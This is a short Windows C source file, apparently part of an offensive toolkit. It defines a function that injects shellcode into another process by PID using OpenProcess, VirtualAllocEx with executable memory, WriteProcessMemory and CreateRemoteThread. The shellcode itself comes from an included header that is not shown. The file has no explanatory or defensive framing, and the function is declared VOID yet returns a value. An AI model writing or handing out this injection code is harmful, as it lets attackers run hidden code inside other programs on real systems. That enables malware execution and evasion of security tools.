#include <Windows.h>
#include <stdio.h>
#include "AsmCodes.h"

VOID InjectShellcodeRemoteProcess(UINT32 ProcessId)
{
	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;
	unsigned char shellcode[] = SHELLCODE;

	printf("Injecting to PID: %i", ProcessId);
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD) ProcessId);
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);

	return 0;
}